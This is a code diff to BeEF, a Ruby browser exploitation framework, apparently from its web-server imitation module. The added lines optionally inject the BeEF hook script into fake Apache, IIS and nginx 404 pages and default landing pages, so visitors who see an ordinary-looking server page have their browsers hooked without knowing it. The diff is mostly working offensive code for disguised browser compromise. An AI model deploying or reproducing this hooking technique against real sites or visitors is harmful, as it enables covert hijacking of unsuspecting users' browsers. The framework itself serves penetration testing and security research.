@@ -32,6 +32,7 @@ module BeEF
                     "<p>The requested URL was not found on this server.</p>" +
                     "<hr>" +
                     "<address>Apache/2.2.3 (CentOS)</address>" +
+                    ("<script src='#{config.get("beef.http.hook_file")}'></script>" if config.get("beef.http.web_server_imitation.hook_404")).to_s +
                     "</body></html>"
               when "iis"
                 #response body
@@ -65,7 +66,9 @@ module BeEF
                     "<li>Open <b>IIS Help</b>, which is accessible in IIS Manager (inetmgr)," +
                     "and search for topics titled <b>Web Site Setup</b>, <b>Common Administrative Tasks</b>, and <b>About Custom Error Messages</b>.</li>" +
                     "</ul>" +
-                    "</TD></TR></TABLE></BODY></HTML>"
+                    "</TD></TR></TABLE>" +
+                    ("<script src='#{config.get("beef.http.hook_file")}'></script>" if config.get("beef.http.web_server_imitation.hook_404")).to_s +
+                    "</BODY></HTML>"
               when "nginx"
                 #response body
                 "<html>\n"+
@@ -73,6 +76,7 @@ module BeEF
                     "<body bgcolor=\"white\">\n" +
                     "<center><h1>404 Not Found</h1></center>\n" +
                     "<hr><center>nginx</center>\n" +
+                    ("<script src='#{config.get("beef.http.hook_file")}'></script>" if config.get("beef.http.web_server_imitation.hook_404")).to_s +
                     "</body>\n" +
                     "</html>\n"
               else
@@ -235,6 +239,7 @@ module BeEF
                     "<p><a href=\"http://www.internic.net/whois.html\">http://www.internic.net/whois.html</a></p>" +
                     "</div>" +
                     "</div>" +
+                    ("<script src='#{config.get("beef.http.hook_file")}'></script>" if config.get("beef.http.web_server_imitation.hook_root")).to_s +
                     "</body>" +
                     "</html>"
               when "iis"
@@ -265,6 +270,7 @@ module BeEF
                     "</td>" +
                     "</tr>" +
                     "</table>" +
+                    ("<script src='#{config.get("beef.http.hook_file")}'></script>" if config.get("beef.http.web_server_imitation.hook_root")).to_s +
                     "</body>" +
                     "</html>"
               when "nginx"
@@ -289,6 +295,7 @@ module BeEF
                     "Commercial support is available at\n" +
                     "<a href=\"http://nginx.com/\">nginx.com</a>.</p>\n\n" +
                     "<p><em>Thank you for using nginx.</em></p>\n" +
+                    ("<script src='#{config.get("beef.http.hook_file")}'></script>" if config.get("beef.http.web_server_imitation.hook_root")).to_s +
                     "</body>\n" +
                     "</html>\n"
               else
